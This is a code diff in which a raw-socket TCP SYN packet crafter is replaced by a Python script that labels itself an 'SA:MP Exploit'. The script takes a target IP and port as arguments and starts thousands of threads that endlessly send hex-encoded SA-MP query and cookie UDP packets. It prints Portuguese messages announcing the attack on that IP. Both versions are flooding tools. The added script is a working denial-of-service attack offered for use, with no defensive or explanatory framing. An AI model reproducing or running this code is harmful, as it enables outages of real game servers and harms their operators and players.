@@ -1,70 +1,63 @@
-﻿import socket, sys
-from struct import *
- 
-def checksum(msg):
-    s = 0
-    for i in range(0, len(msg), 2):
-        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
-        s = s + w   
-    s = (s>>16) + (s & 0xffff);
-    s = ~s & 0xffff
-    return s
- 
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-except socket.error , msg:
-    print 'Socket could not be created. Error Code : ' + str(msg[0]) +' Message ' + msg[1]
-    sys.exit()
- 
-s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    
-seq = 0
+import socket
+import struct
+import codecs,sys
+import threading
+import random
+import time
+import os
 
-for i in range(1,100):
-	packet = '';
-	source_ip = '192.168.154.130'
-	dest_ip = '192.168.154.128' 
-	#ip head
-	ihl = 5
-	version = 4
-	tos = 0
-	tot_len = 20 + 20
-	id = 54321  
-	frag_off = 0
-	ttl = 255
-	protocol = socket.IPPROTO_TCP
-	check = 10  
-	daddr = socket.inet_aton(dest_ip)
-	saddr =socket.inet_aton(source_ip) 
-	ihl_version = (version << 4) + ihl
- 	ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
-	#tcp head
-	source = 1234  
-	dest = 80+i   
-	seq = i
-	ack_seq = 0
-	doff = 5    
-	fin = 0
-	syn = 1
-	rst = 0
-	psh = 0
-	ack = 0
-	urg = 0
-	window = socket.htons (5840)    
-	check = 0
-	urg_ptr = 0
-	offset_res = (doff << 4) + 0
-	tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) +(ack << 4) + (urg << 5)
-	tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
-	#tcp pseudo 
-	dest_address = socket.inet_aton(dest_ip)
-	source_address = socket.inet_aton(source_ip)
-	placeholder = 0
-	protocol = socket.IPPROTO_TCP
-	tcp_length = len(tcp_header) 
-	psh = pack('!4s4sBBH', source_address , dest_address , placeholder , protocol , tcp_length);
-	psh = psh + tcp_header; 
-	tcp_checksum = checksum(psh)
-	tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
-	packet = ip_header + tcp_header
-	s.sendto(packet, (dest_ip , 0))
+
+ip = sys.argv[1]
+port = sys.argv[2]
+orgip =ip
+
+Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
+                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
+                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
+                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
+                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
+                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
+                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
+                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
+                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
+                       ]
+
+
+print("Ataque iniciado no ip: %s e Porta: %s"%(orgip,port))
+
+
+class MyThread(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
+                
+                msg = Pacotes[random.randrange(0,7)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port))) 
+
+if __name__ == '__main__':
+    try:
+     for x in range(16535):                                    
+            mythread = MyThread()  
+            mythread.start()                                  
+            time.sleep(.1)    
+    except(KeyboardInterrupt):
+         os.system('cls' if os.name == 'nt' else 'clear')
+         
+         print('#########################################################################')
+         print('SA:MP Exploit')
+         print('#########################################################################')
+         print('\n\n')
+         print('Ataque para ip {} foi parado'.format(orgip))
+         pass
